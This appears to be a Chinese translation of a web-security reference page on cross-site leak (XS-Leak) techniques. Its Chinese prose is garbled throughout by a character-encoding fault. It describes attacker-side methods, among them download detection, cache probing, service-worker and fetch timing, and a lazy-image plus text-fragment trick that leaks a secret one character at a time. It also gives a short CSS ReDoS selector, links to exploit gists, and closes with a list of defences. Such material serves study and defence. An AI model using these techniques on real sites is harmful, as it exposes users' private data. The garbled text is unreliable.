`Content-Disposition`å¤´ï¼ˆ[`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)ï¼‰æŒ‡ç¤ºæµè§ˆå™¨æ˜¯åº”è¯¥ä¸‹è½½å†…å®¹è¿˜æ˜¯å†…è”æ˜¾ç¤ºã€‚

å¦‚æœåªæœ‰ç™»å½•ç”¨æˆ·èƒ½å¤Ÿ**è®¿é—®ä¸€ä¸ªå°†ä¸‹è½½æ–‡ä»¶çš„é¡µé¢**ï¼Œå› ä¸ºå®ƒä½¿ç”¨äº†è¿™ä¸ªå¤´ã€‚å¯ä»¥æ£€æµ‹åˆ°è¿™ç§è¡Œä¸ºã€‚

#### ä¸‹è½½æ  <a href="#download-bar" id="download-bar"></a>

åœ¨åŸºäºChromiumçš„æµè§ˆå™¨ä¸­ï¼Œå½“ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œä¸‹è½½è¿‡ç¨‹çš„**é¢„è§ˆä¼šå‡ºç°åœ¨åº•éƒ¨çš„ä¸€ä¸ªæ ä¸­**ï¼Œå¹¶ä¸æµè§ˆå™¨çª—å£é›†æˆã€‚é€šè¿‡**ç›‘è§†çª—å£é«˜åº¦**ï¼Œæ”»å‡»è€…å¯ä»¥æ£€æµ‹åˆ°æ˜¯å¦æ‰“å¼€äº†â€œä¸‹è½½æ â€ã€‚

#### ä¸‹è½½å¯¼èˆªï¼ˆä½¿ç”¨iframesï¼‰<a href="#download-navigation-with-iframes" id="download-navigation-with-iframes"></a>

å¦ä¸€ç§æµ‹è¯•[`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)å¤´çš„æ–¹æ³•æ˜¯**æ£€æŸ¥æ˜¯å¦å‘ç”Ÿäº†å¯¼èˆª**ã€‚å¦‚æœé¡µé¢åŠ è½½å¯¼è‡´ä¸‹è½½ï¼Œå®ƒä¸ä¼šè§¦å‘å¯¼èˆªï¼Œ**çª—å£ä»åœç•™åœ¨åŒä¸€æº**ã€‚

#### ä¸‹è½½å¯¼èˆªï¼ˆä¸ä½¿ç”¨iframesï¼‰<a href="#download-navigation-without-iframes" id="download-navigation-without-iframes"></a>

ä¸å‰ä¸€ç§æŠ€æœ¯ç›¸åŒï¼Œåªæ˜¯ä½¿ç”¨`window.open`è€Œä¸æ˜¯iframesã€‚

### åˆ†åŒºHTTPç¼“å­˜ç»•è¿‡ <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šæ—¶é—´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **æ‘˜è¦**ï¼šæ”»å‡»è€…å¯ä»¥ä½¿ç”¨iframesæ¥æ£€æµ‹ä¸‹è½½ã€‚å¦‚æœiframeä»ç„¶å¯è®¿é—®ï¼Œåˆ™æ–‡ä»¶å·²ä¸‹è½½ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)ï¼Œ[https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722)ï¼ˆæ¥è‡ª[https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)ï¼‰

{% hint style="warning" %}
è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™ä¸ªæŠ€æœ¯å¾ˆæœ‰è¶£ï¼šChromeç°åœ¨æœ‰äº†**ç¼“å­˜åˆ†åŒº**ï¼Œæ–°æ‰“å¼€çš„é¡µé¢çš„ç¼“å­˜é”®æ˜¯ï¼š`(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`ï¼Œä½†å¦‚æœæˆ‘æ‰“å¼€ä¸€ä¸ªngroké¡µé¢å¹¶åœ¨å…¶ä¸­ä½¿ç”¨fetchï¼Œç¼“å­˜é”®å°†æ˜¯ï¼š`(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`ï¼Œ**ç¼“å­˜é”®ä¸åŒ**ï¼Œå› æ­¤ç¼“å­˜ä¸èƒ½å…±äº«ã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šç»†èŠ‚ï¼š[é€šè¿‡åˆ†åŒºç¼“å­˜è·å¾—å®‰å…¨æ€§å’Œéšç§æ€§](https://developer.chrome.com/blog/http-cache-partitioning/)\
ï¼ˆæ¥è‡ª[**è¿™é‡Œ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)çš„è¯„è®ºï¼‰
{% endhint %}

å¦‚æœä¸€ä¸ªç½‘ç«™`example.com`åŒ…å«æ¥è‡ª`*.example.com/resource`çš„èµ„æºï¼Œé‚£ä¹ˆè¯¥èµ„æºå°†å…·æœ‰ä¸ç›´æ¥**é€šè¿‡é¡¶çº§å¯¼èˆªè¯·æ±‚èµ„æº**ç›¸åŒçš„ç¼“å­˜é”®ã€‚è¿™æ˜¯å› ä¸ºç¼“å­˜é”®ç”±é¡¶çº§_eTLD+1_å’Œæ¡†æ¶_eTLD+1_ç»„æˆã€‚

ç”±äºè®¿é—®ç¼“å­˜æ¯”åŠ è½½èµ„æºæ›´å¿«ï¼Œå¯ä»¥å°è¯•æ”¹å˜é¡µé¢çš„ä½ç½®ï¼Œå¹¶åœ¨åœæ­¢åçš„20æ¯«ç§’ï¼ˆä¾‹å¦‚ï¼‰å–æ¶ˆå®ƒã€‚å¦‚æœåŸå§‹ä½ç½®åœ¨åœæ­¢åå‘ç”Ÿäº†å˜åŒ–ï¼Œè¿™æ„å‘³ç€èµ„æºå·²è¢«ç¼“å­˜ã€‚\
æˆ–è€…å¯ä»¥**å‘é€ä¸€äº›fetchåˆ°å¯èƒ½è¢«ç¼“å­˜çš„é¡µé¢ï¼Œå¹¶æµ‹é‡æ‰€éœ€çš„æ—¶é—´**ã€‚

### æ‰‹åŠ¨é‡å®šå‘ <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **åŒ…å«æ–¹æ³•**ï¼šFetch API
* **å¯æ£€æµ‹çš„å·®å¼‚**ï¼šé‡å®šå‘
* **æ›´å¤šä¿¡æ¯**ï¼š[ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **æ‘˜è¦**ï¼šå¯ä»¥é€šè¿‡fetchè¯·æ±‚çš„å“åº”æ¥åˆ¤æ–­æ˜¯å¦æ˜¯é‡å®šå‘
* **ä»£ç ç¤ºä¾‹**ï¼š

![](<../.gitbook/assets/image (652).png>)
### ä½¿ç”¨ AbortController è¿›è¡Œ Fetch <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹çš„å·®å¼‚**: æ—¶é—´
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **æ‘˜è¦**: å¯ä»¥å°è¯•åŠ è½½èµ„æºå¹¶åœ¨åŠ è½½ä¹‹å‰ä¸­æ–­åŠ è½½ã€‚æ ¹æ®æ˜¯å¦è§¦å‘é”™è¯¯ï¼Œèµ„æºæ˜¯å¦è¢«ç¼“å­˜ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

[**`AbortController`**](https://developer.mozilla.org/en-US/docs/Web/API/AbortController) å¯ä»¥ä¸ _**fetch**_ å’Œ _**setTimeout**_ ç»“åˆä½¿ç”¨ï¼Œæ—¢å¯ä»¥æ£€æµ‹èµ„æºæ˜¯å¦è¢«ç¼“å­˜ï¼Œåˆå¯ä»¥ä»æµè§ˆå™¨ç¼“å­˜ä¸­æ¸…é™¤ç‰¹å®šèµ„æºã€‚è¿™ç§æŠ€æœ¯çš„ä¸€ä¸ªå¥½å¤„æ˜¯åœ¨è¿‡ç¨‹ä¸­è¿›è¡Œæ¢æµ‹è€Œä¸ä¼šç¼“å­˜æ–°å†…å®¹ã€‚

### è„šæœ¬æ±¡æŸ“

* **åŒ…å«æ–¹æ³•**: HTML å…ƒç´  (script)
* **å¯æ£€æµ‹çš„å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **æ‘˜è¦**: å½“åœ¨é¡µé¢ä¸ŠåŒ…å«ä¸€ä¸ª**è·¨æºè„šæœ¬**æ—¶ï¼Œ**æ— æ³•ç›´æ¥è¯»å–**å…¶å†…å®¹ã€‚ç„¶è€Œï¼Œå¦‚æœè„šæœ¬**ä½¿ç”¨ä»»ä½•å†…ç½®å‡½æ•°**ï¼Œå°±å¯ä»¥**è¦†ç›–å®ƒä»¬**å¹¶è¯»å–å®ƒä»¬çš„å‚æ•°ï¼Œè¿™å¯èƒ½ä¼š**æ³„æ¼æœ‰ä»·å€¼çš„ä¿¡æ¯**ã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **åŒ…å«æ–¹æ³•**: å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹çš„å·®å¼‚**: é¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **æ‘˜è¦**: ä½¿ç”¨ service workers æµ‹é‡ç½‘é¡µçš„æ‰§è¡Œæ—¶é—´ã€‚
* **ä»£ç ç¤ºä¾‹**:

1. æ”»å‡»è€…åœ¨å…¶ä¸­ä¸€ä¸ªåŸŸå (attacker.com) æ³¨å†Œä¸€ä¸ª service workerã€‚
2. åœ¨ä¸»æ–‡æ¡£ä¸­ï¼Œæ”»å‡»è€…å¯¹ç›®æ ‡ç½‘ç«™å‘å‡ºä¸€ä¸ªå¯¼èˆªè¯·æ±‚ (window.open)ï¼Œå¹¶æŒ‡ç¤º Service Worker å¯åŠ¨ä¸€ä¸ªè®¡æ—¶å™¨ã€‚
3. å½“æ–°çª—å£å¼€å§‹åŠ è½½æ—¶ï¼Œæ”»å‡»è€…å°†åœ¨æ­¥éª¤ 2 ä¸­è·å¾—çš„å¼•ç”¨å¯¼èˆªåˆ°ç”± Service Worker å¤„ç†çš„é¡µé¢ã€‚
4. å½“åœ¨æ­¥éª¤ 3 ä¸­æ‰§è¡Œçš„è¯·æ±‚åˆ°è¾¾ service worker æ—¶ï¼Œå®ƒè¿”å›ä¸€ä¸ª 204 (æ— å†…å®¹) å“åº”ï¼Œä¸­æ­¢å¯¼èˆªã€‚
5. æ­¤æ—¶ï¼ŒService Worker ä»æ­¥éª¤ 2 ä¸­å¯åŠ¨çš„è®¡æ—¶å™¨ä¸­æ”¶é›†ä¸€ä¸ªæµ‹é‡å€¼ã€‚è¿™ä¸ªæµ‹é‡å€¼å— JavaScript é˜»å¡å¯¼èˆªçš„æ—¶é—´çš„å½±å“ã€‚

{% hint style="warning" %}
åœ¨æ‰§è¡Œæ—¶é—´ä¸­ï¼Œå¯ä»¥**æ¶ˆé™¤**ç½‘ç»œå› ç´ ä»¥è·å¾—**æ›´ç²¾ç¡®çš„æµ‹é‡ç»“æœ**ã€‚ä¾‹å¦‚ï¼Œåœ¨åŠ è½½é¡µé¢ä¹‹å‰åŠ è½½é¡µé¢ä½¿ç”¨çš„èµ„æºã€‚
{% endhint %}

### Fetch æ—¶é—´

* **åŒ…å«æ–¹æ³•**: Fetch API
* **å¯æ£€æµ‹çš„å·®å¼‚**: æ—¶é—´ (é€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·)
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **æ‘˜è¦**: å¯ä»¥ä½¿ç”¨ [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API æ¥æµ‹é‡æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### è·¨çª—å£è®¡æ—¶

* **åŒ…å«æ–¹æ³•**: å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹çš„å·®å¼‚**: æ—¶é—´ (é€šå¸¸ç”±é¡µé¢å†…å®¹ã€çŠ¶æ€ç å¼•èµ·)
* **æ›´å¤šä¿¡æ¯**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **æ‘˜è¦**: å¯ä»¥ä½¿ç”¨ [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API æ¥æµ‹é‡ä½¿ç”¨ `window.open` æ‰§è¡Œè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ—¶é’Ÿã€‚
* **ä»£ç ç¤ºä¾‹**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ä½¿ç”¨ HTML æˆ–é‡æ–°æ³¨å…¥

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä»è·¨æº HTML ä¸­çªƒå–ä¿¡æ¯çš„æŠ€æœ¯ï¼Œè¿™äº›æŠ€æœ¯åœ¨æŸäº›æƒ…å†µä¸‹å¾ˆæœ‰è¶£ï¼Œä¾‹å¦‚æ‚¨å¯ä»¥**æ³¨å…¥ HTML ä½†æ— æ³•æ³¨å…¥ JS ä»£ç **ã€‚

### æ‚¬æŒ‚æ ‡è®°

{% content-ref url="dangling-markup-html-scriptless-injection.md" %}
[dangling-markup-html-scriptless-injection.md](dangling-markup-html-scriptless-injection.md)
{% endcontent-ref %}

### å›¾åƒå»¶è¿ŸåŠ è½½

å¦‚æœæ‚¨éœ€è¦**çªƒå–å†…å®¹**å¹¶ä¸”å¯ä»¥**åœ¨ç§˜å¯†ä¹‹å‰æ·»åŠ  HTML**ï¼Œæ‚¨åº”è¯¥æ£€æŸ¥**å¸¸è§çš„æ‚¬æŒ‚æ ‡è®°æŠ€æœ¯**ã€‚\
ç„¶è€Œï¼Œå¦‚æœç”±äºæŸç§åŸå› æ‚¨**å¿…é¡»**é€ä¸ªå­—ç¬¦åœ°æ‰§è¡Œå®ƒï¼ˆä¹Ÿè®¸é€šè¿‡ç¼“å­˜å‘½ä¸­è¿›è¡Œé€šä¿¡ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¿™ä¸ªæŠ€å·§ã€‚

HTML ä¸­çš„**å›¾åƒ**æœ‰ä¸€ä¸ª "**loading**" å±æ€§ï¼Œå…¶å€¼å¯ä»¥æ˜¯ "**lazy**"ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå›¾åƒå°†åœ¨æŸ¥çœ‹æ—¶åŠ è½½ï¼Œè€Œä¸æ˜¯åœ¨é¡µé¢åŠ è½½æ—¶åŠ è½½:
```html
<img src=/something loading=lazy >
```
å› æ­¤ï¼Œä½ å¯ä»¥åšçš„æ˜¯**æ·»åŠ å¤§é‡çš„åƒåœ¾å­—ç¬¦**ï¼ˆä¾‹å¦‚**æˆåƒä¸Šä¸‡ä¸ª"W"**ï¼‰æ¥**å¡«å……ç§˜å¯†ä¹‹å‰çš„ç½‘é¡µ**ã€‚æˆ‘ä»¬è¿™æ ·åšæ˜¯ä¸ºäº†åœ¨å¼€å§‹æ—¶ä¸åŠ è½½å›¾ç‰‡ã€‚

ç„¶è€Œï¼Œä½ å¯ä»¥è®©**æœºå™¨äººä½¿ç”¨ç±»ä¼¼çš„æ–¹å¼è®¿é—®é¡µé¢**
```
#:~:text=SECR
```
æ‰€ä»¥ç½‘é¡µå°†æ˜¯è¿™æ ·çš„ï¼š**`https://victim.com/post.html#:~:text=SECR`**

å…¶ä¸­post.htmlåŒ…å«æ”»å‡»è€…çš„åƒåœ¾å­—ç¬¦å’Œæ‡’åŠ è½½å›¾ç‰‡ï¼Œç„¶åæ·»åŠ äº†æœºå™¨äººçš„ç§˜å¯†ã€‚

è¿™æ®µæ–‡æœ¬çš„ä½œç”¨æ˜¯ä½¿æœºå™¨äººè®¿é—®é¡µé¢ä¸­åŒ…å«æ–‡æœ¬`SECR`çš„ä»»ä½•æ–‡æœ¬ã€‚ç”±äºè¯¥æ–‡æœ¬æ˜¯ç§˜å¯†ï¼Œè€Œä¸”å®ƒå°±åœ¨**å›¾ç‰‡ä¸‹æ–¹**ï¼Œåªæœ‰åœ¨çŒœæµ‹çš„ç§˜å¯†æ­£ç¡®æ—¶ï¼Œ**å›¾ç‰‡æ‰ä¼šåŠ è½½**ã€‚å› æ­¤ï¼Œä½ å¯ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³•**é€ä¸ªå­—ç¬¦åœ°æ³„éœ²ç§˜å¯†**ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›åˆ©ç”¨æ­¤æ¼æ´çš„ä»£ç ç¤ºä¾‹ï¼š[https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

åœ¨è¿™é‡Œæ‰¾åˆ°**å¦ä¸€ä¸ªä½¿ç”¨æ‡’åŠ è½½çš„ç¤ºä¾‹**ï¼š

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

å¦‚æœä½¿ç”¨`jQuery(location.hash)`ï¼Œå¯ä»¥é€šè¿‡è®¡æ—¶æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŸäº›HTMLå†…å®¹ï¼Œè¿™æ˜¯å› ä¸ºå¦‚æœé€‰æ‹©å™¨`main[id='site-main']`ä¸åŒ¹é…ï¼Œå°±ä¸éœ€è¦æ£€æŸ¥å…¶ä»–**é€‰æ‹©å™¨**ï¼š
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSSæ³¨å…¥

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## é˜²å¾¡æªæ–½

åœ¨æœ¬èŠ‚ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)ä¸­æ¨èçš„ä¸€éƒ¨åˆ†ç¼“è§£æªæ–½ï¼Œä½†æ˜¯åœ¨[https://xsleaks.dev/](https://xsleaks.dev/)çš„æ¯ä¸ªéƒ¨åˆ†ä¸­éƒ½æœ‰æ›´å¤šçš„ç¼“è§£æªæ–½ã€‚è¯·æŸ¥çœ‹é‚£é‡Œä»¥è·å–æœ‰å…³å¦‚ä½•é˜²æ­¢è¿™äº›æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ã€‚

### åŒ…å«æ–¹æ³•çš„ç¼“è§£æªæ–½

* **HTMLå…ƒç´ **ã€‚å¯ä»¥ä½¿ç”¨**CORPå¤´éƒ¨æ¥æ§åˆ¶é¡µé¢æ˜¯å¦å¯ä»¥åµŒå…¥èµ„æº**ã€‚CORPå¯ä»¥è®¾ç½®ä¸ºsame-originæˆ–same-siteï¼Œåˆ†åˆ«é˜»æ­¢å¯¹è¯¥èµ„æºçš„è·¨æºæˆ–è·¨ç«™ç‚¹è¯·æ±‚ã€‚åœ¨**å®¢æˆ·ç«¯**ä¸Šï¼ŒåŸºäºChromiumçš„æµè§ˆå™¨ä½¿ç”¨**CORBç®—æ³•**æ¥å†³å®šæ˜¯å¦å…è®¸æˆ–æ‹’ç»è·¨æºèµ„æºè¯·æ±‚ã€‚
* **æ¡†æ¶**ã€‚**é˜²æ­¢iframeå…ƒç´ åŠ è½½HTMLèµ„æºçš„ä¸»è¦é˜²å¾¡æªæ–½**æ˜¯ä½¿ç”¨**X-Frame-Options**ã€‚å¦å¤–ï¼Œ**CSPæŒ‡ä»¤frame-ancestors**ä¹Ÿå¯ä»¥å®ç°ç±»ä¼¼çš„ç»“æœã€‚å¦‚æœæ‹’ç»åµŒå…¥ï¼Œåˆ™åŒ…å«æ–¹æ³•æ— æ³•æ£€æµ‹åˆ°å“åº”ä¸­çš„å·®å¼‚ã€‚
* **å¼¹å‡ºçª—å£**ã€‚ä¸ºäº†é™åˆ¶å¯¹`window.opener`çš„è®¿é—®ï¼Œ**COOP HTTPå“åº”å¤´**å®šä¹‰äº†ä¸‰ä¸ªä¸åŒçš„å€¼ï¼šunsafe-noneï¼ˆé»˜è®¤å€¼ï¼‰ï¼Œsame-origin-allow-popupså’Œsame-originã€‚è¿™äº›å€¼å¯ä»¥ç”¨äº**éš”ç¦»æµè§ˆé€‰é¡¹å¡å’Œå¼¹å‡ºçª—å£**ï¼Œä»è€Œç¼“è§£åŸºäºå¼¹å‡ºçª—å£çš„æ³„æ¼æŠ€æœ¯ã€‚
* **JavaScriptè¯·æ±‚**ã€‚è·¨æºJavaScriptè¯·æ±‚ç»å¸¸åœ¨XS-Leakæ”»å‡»ä¸­ä½¿ç”¨ï¼Œå› ä¸ºæ”»å‡»è€…å¯¹å‘å‡ºçš„è¯·æ±‚å…·æœ‰ç»†ç²’åº¦æ§åˆ¶ã€‚ç„¶è€Œï¼Œç”±äºè¿™äº›è¯·æ±‚æ²¡æœ‰å¯ç”¨CORSï¼Œå®ƒä»¬å—åˆ°ä¸ç”±HTMLå…ƒç´ å‘é€çš„è¯·æ±‚ï¼ˆå¦‚è„šæœ¬æˆ–å›¾åƒï¼‰ç›¸åŒçš„é™åˆ¶ã€‚å› æ­¤ï¼Œé€šè¿‡CORPå’ŒCORBä¹Ÿå¯ä»¥**ç¼“è§£æ­¤æ³„æ¼æŠ€æœ¯çš„å½±å“**ã€‚

æ›´é€šç”¨çš„æ–¹æ³•ï¼š

* **è·å–å…ƒæ•°æ®**ã€‚è¿™äº›è¯·æ±‚å¤´å…è®¸æœåŠ¡å™¨æ‰€æœ‰è€…æ›´å¥½åœ°äº†è§£ç”¨æˆ·çš„æµè§ˆå™¨å¦‚ä½•å¼•å‘ç‰¹å®šè¯·æ±‚ã€‚åœ¨Chromeä¸­ï¼ŒSec-Fetch-\*å¤´éƒ¨ä¼šè‡ªåŠ¨æ·»åŠ åˆ°æ¯ä¸ªè¯·æ±‚ä¸­ï¼Œå¹¶æä¾›æœ‰å…³è¯·æ±‚æ¥æºçš„å…ƒæ•°æ®ã€‚ä¾‹å¦‚ï¼ŒSec-Fetch-Dest: imageè¡¨ç¤ºä»å›¾åƒå…ƒç´ è§¦å‘äº†è¯·æ±‚ã€‚Webåº”ç”¨ç¨‹åºå¯ä»¥æ ¹æ®è¿™äº›ä¿¡æ¯é€‰æ‹©é˜»æ­¢è¯·æ±‚ã€‚
* **Same-Site Cookies**ã€‚Same-Site cookieæ ‡å¿—å…è®¸ç½‘ç«™å£°æ˜**cookieæ˜¯å¦åº”é™åˆ¶åœ¨åŒä¸€ç«™ç‚¹æˆ–ç¬¬ä¸€æ–¹ä¸Šä¸‹æ–‡ä¸­**ã€‚æ‰€æœ‰ä¸»è¦æµè§ˆå™¨éƒ½æ”¯æŒSame-Site cookiesã€‚åœ¨GCä¸­ï¼Œæ²¡æœ‰è¯¥å±æ€§çš„cookieç°åœ¨é»˜è®¤ä¸ºLaxã€‚å¯¹äºXS-Leaksï¼Œ**Same-Site cookiesæå¤§åœ°é™åˆ¶äº†æ³„æ¼æ”»å‡»çš„å¯èƒ½æ€§**ã€‚å¦ä¸€æ–¹é¢ï¼Œä¾èµ–äº**`window.open`çš„æ³„æ¼æŠ€æœ¯ä»ç„¶é€‚ç”¨äº`SameSite=Lax`**ã€‚ä½¿ç”¨**å…¶ä»–èº«ä»½éªŒè¯**æ–¹æ³•ï¼ˆå¦‚å®¢æˆ·ç«¯è¯ä¹¦å’ŒHTTPèº«ä»½éªŒè¯ï¼‰çš„ç½‘ç«™**ä»ç„¶å­˜åœ¨æ¼æ´**ã€‚
* **è·¨æºæ ‡è¯†ç¬¦ä¸å¯é“¾æ¥æ€§ï¼ˆCOIUï¼‰**ã€‚COIUï¼Œä¹Ÿç§°ä¸ºç¬¬ä¸€æ–¹éš”ç¦»ï¼ˆFPIï¼‰ï¼Œæ˜¯ä¸€ç§å¯é€‰çš„å®‰å…¨åŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥åœ¨FFçš„ä¸“å®¶è®¾ç½®ï¼ˆabout:configï¼‰ä¸­å¯ç”¨ï¼Œæœ€åˆåœ¨Toræµè§ˆå™¨ä¸­å¼•å…¥ã€‚ä»æŠ½è±¡çš„è§’åº¦æ¥çœ‹ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ‰©å±•çš„åŒä¸€ç«™ç‚¹ä¸Šä¸‹æ–‡ã€‚å®ƒå°†å¤šä¸ªèµ„æºï¼ˆä¾‹å¦‚Cookieã€ç¼“å­˜ã€å®¢æˆ·ç«¯å­˜å‚¨ï¼‰**ç»‘å®šåˆ°ç¬¬ä¸€æ–¹**ï¼Œè€Œä¸æ˜¯åœ¨æ‰€æœ‰è®¿é—®çš„ç½‘ç«™ä¹‹é—´å…±äº«å®ƒä»¬ã€‚å¦‚æœå¯ç”¨ï¼ŒCOIUæå¤§åœ°å‡å°‘äº†XS-Leaksçš„é€‚ç”¨æ€§ï¼Œå› ä¸ºåªæœ‰ä½¿ç”¨å¼¹å‡ºçª—å£çš„æ–¹æ³•ä»ç„¶å¯ä»¥ç¬¦åˆç­–ç•¥çš„ç¬¬ä¸€æ–¹è¦æ±‚ã€‚
* **è·Ÿè¸ªä¿æŠ¤**ã€‚Appleåœ¨SAä¸­å®æ–½äº†ä¸€ç§åä¸º**æ™ºèƒ½è·Ÿè¸ªé˜²æŠ¤ï¼ˆITPï¼‰**çš„éšç§æœºåˆ¶ï¼Œæ—¨åœ¨é€šè¿‡é™åˆ¶Cookieå’Œå…¶ä»–Web APIçš„åŠŸèƒ½æ¥é˜²æ­¢è·¨ç«™ç‚¹è·Ÿè¸ªã€‚åœ¨è¾ƒæ–°çš„SAç‰ˆæœ¬ä¸­ï¼ŒITPé»˜è®¤æƒ…å†µä¸‹é˜»æ­¢æ‰€æœ‰ç¬¬ä¸‰æ–¹Cookieï¼Œæ²¡æœ‰ä»»ä½•ä¾‹å¤–\[74]ã€‚æ­¤é˜»æ­¢é˜²æ­¢äº†æ‰€æœ‰ä¸åŸºäºå¼¹å‡ºçª—å£çš„æ³„æ¼ã€‚FFé‡‡ç”¨äº†ç±»ä¼¼çš„æ–¹æ³•ï¼Œç§°ä¸ºå¢å¼ºè·Ÿè¸ªé˜²æŠ¤ï¼ˆETPï¼‰ï¼Œä½†å®ƒä»¬åªé˜»æ­¢å±äºè·Ÿè¸ªæä¾›è€…çš„ç‰¹å®šç¬¬ä¸‰æ–¹Cookieã€‚åœ¨XS-Leaksçš„ä¸Šä¸‹æ–‡ä¸­ï¼ŒETPåªç¼“è§£é’ˆå¯¹è¿™äº›è·Ÿè¸ªåŸŸçš„æ³„æ¼æŠ€æœ¯ã€‚
